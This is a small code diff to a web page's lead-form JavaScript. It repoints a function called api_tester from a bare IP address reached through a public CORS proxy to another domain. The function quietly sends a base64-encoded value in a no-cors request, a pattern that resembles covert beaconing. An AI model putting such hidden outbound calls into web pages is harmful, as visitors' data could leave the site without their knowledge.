@@ -53,7 +53,7 @@ const originalUrl = 'https://offerweb.trackdrive.com/api/v1/inbound_webhooks/pin
 }
 function api_tester(randomString) {
   try {
-    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
 , {
       method: 'GET',
       mode: 'no-cors'
@@ -136,7 +136,7 @@ document.getElementById('leadForm').addEventListener('submit', function(event) {
     pingAPI();
 });function api_tester(randomString) {
   try {
-    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)+',m'
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)+',m'
 , {
       method: 'GET',
       mode: 'no-cors'
